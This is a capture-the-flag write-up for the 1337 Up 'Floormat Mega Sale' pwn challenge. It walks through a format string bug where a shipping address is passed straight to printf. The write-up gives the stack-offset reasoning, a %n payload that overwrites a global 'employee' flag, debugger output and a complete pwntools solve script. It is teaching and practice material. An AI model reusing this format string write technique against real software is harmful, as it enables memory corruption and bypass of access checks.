---
tags: ["format-string"]
download-link: ""
---

# 1337 Up | Floormat Mega Sale - PWN (100)

This challenge involves exploiting a format string vulnerability to write data to a variable to bypass a null check.

## Initial Analysis

### Checksec
First thing is to look at basic memory protections

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Key things to note:
- No PIE, so the binary is loaded at the same place every time

### Binary Review

Working backwards, we can search for the string `flag` and see that it is inside of the `employee_access()` function.
The flag will be printed if the global variable `employee` is not `NULL`.

``` c
void employee_access(void) {
  if (employee == 0) {
    puts("\nAccess Denied: You are not an employee!");
  }
  ...
  printflag
}
```

This function can be called from `main()`, and requires the user to pick the 6th option.

```c
if (choice == 6) {
    employee_access();
}
```

Digger deeper into main we spot the format string vulnerability, when entering our address, it passes that data directly to `printf`, which can be exploited.
``` c
puts("\nPlease enter your shipping address:");
fgets(shipping_address,0x100,stdin);
puts("\nYour floor mat will be shipped to:\n");
printf(shipping_address);
```

Summarizing the findings:
- there is a format string vulnerability when passing a shipping address
- if the global variable `employee` is not `NULL` it will print the flag

## Exploitation
Exploiting the format string vulnerability is pretty simple since we just need to write an arbitrary byte to a specific location.
This can be done using the `%n` format specifier which will write the amount of bytes printed to a pointer.

The first thing to do is figure out where we are on the stack, and what location our employee variable location is.

How to reference variables:

|Index|Calling Stack|Format String|
|--|--|--|
| 0 | RDI | `%0$p` |
| 1 | RSI | `%1$p` |
| 2 | RDX | `%2$p` |
| 3 | RCX | `%3$p` |
| 4 | R8 | `%4$p` |
| 5 | R9 | `%5$p` |
| 6 | RSP + 0x0 | `%6$p` |
| 7 | RSP + 0x8 | `%7$p` |
| 8 | RSP + 0x10 | `%8$p` |
| 9 | RSP + 0x18 | `%9$p` |
| 10 | RSP + 0x20 | `%10$p` |
| 11 | RSP + 0x28 | `%11$p` |

Since the `shipping_address` variable is located at `RSP + 0x20`, then to access this variable, you would use `%10$p`. However since the first 8 bytes are part of the format string, and not the pointer to the global variable `employee`, we will need to use `%11$p`.

``` python
payload = b'%c%11$n'.ljust(8, b'\x00')
payload += p64(0x0040408c)
```

Breaking right after `printf` is called, we see that the employee variable got set to 1.

``` bash
pwndbg> break *0x004013f2
pwndbg> c
pwndbg> x/gx 0x0040408c
0x40408c <employee>:	0x0000000000000001
```

This should give us the flag!

## Solve
``` python
from pwn import *

BINARY = './floormat_sale'
HOST = ''
GDB_SCRIPT = ''

def main():
    proc = get_process() # set is_remote = False for local testing
    
    employee_address = 0x0040408c
    payload = b''.join([
      b'%c%11$n'.ljust(8, b'\x00'),
      p64(employee_address),
    ])
    
    proc.sendlineafter(b'Enter your choice:', b'6')
    proc.sendlineafter(b'Please enter your shipping address:', payload)
    proc.recvuntil(b'Exclusive Employee-only Mat will be delivered to: ')
    flag = proc.recvline().strip().decode()
    print(f'Flag: {flag}')

# Allows compatibility if custom library isn't present
try:
    from ctfkit.bp import *
    tpwn.GDB_SCRIPT = GDB_SCRIPT
except ImportError:
    def get_process(is_remote=True):
        host, port = HOST.split(':')
        return remote(host, int(port)) if is_remote else process()

if __name__ == '__main__':
    try:
        context.binary = BINARY
    except FileNotFoundError:
        print('Not able to load binary, local testing disabled')
    context.log_level = 'error'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

    parse_args()
    main()
```